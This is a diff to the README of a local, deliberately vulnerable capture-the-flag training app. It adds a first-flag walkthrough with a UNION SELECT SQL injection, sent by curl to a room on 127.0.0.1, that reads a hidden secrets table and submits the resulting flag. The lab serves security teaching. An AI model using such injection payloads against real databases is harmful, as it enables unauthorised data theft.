@@ -21,6 +21,7 @@ Dependency-free (stdlib + SQLite). Runs on **127.0.0.1 only**.
 
 - [Install](#install)
 - [Run it](#run-it)
+- [Take your first flag](#take-your-first-flag)
 - [How a level works](#how-a-level-works)
 - [The levels](#the-levels)
 - [Pairing with wraith & hickok](#pairing-with-wraith--hickok)
@@ -47,6 +48,26 @@ deadwood flag first-blood 'DEADWOOD{...}'   # submit a captured flag
 Open the map in a browser, pick a room, and point your tools at the app URL it
 gives you (e.g. `http://127.0.0.1:8666/l/first-blood/app?id=1`).
 
+## Take your first flag
+
+Room 1 is a staff directory that drops your `id` straight into the SQL. The query
+returns three columns, so a `UNION SELECT` of three values reads any table you
+like — here, the hidden `secrets`:
+
+```console
+$ deadwood serve &
+$ curl 'http://127.0.0.1:8666/l/first-blood/app?id=0 UNION SELECT 1,label,value FROM secrets'
+...
+DEADWOOD{first_blood_825bb8670d30d32c}
+
+$ deadwood flag first-blood 'DEADWOOD{first_blood_825bb8670d30d32c}'
+  ✓ First Blood — taken. that's the hand.
+```
+
+That's the whole loop: find the flaw, read the flag, submit it. Flags are unique
+to your install, so the one above won't match yours — capture your own. Stuck?
+`deadwood learn first-blood` walks you in, one hint at a time.
+
 ## How a level works
 
 Every room is the same shape, easy to the hard:
@@ -62,8 +83,8 @@ captures are tracked locally.
 
 ## The levels
 
-Tutorial → impossible. Each maps to a technique you can practise by hand or drive
-with hickok/wraith:
+Fifteen rooms, Tutorial → Endgame. Each maps to a technique you can practise by
+hand or drive with hickok/wraith:
 
 | # | Room | Tier | Vector |
 |---|------|------|--------|
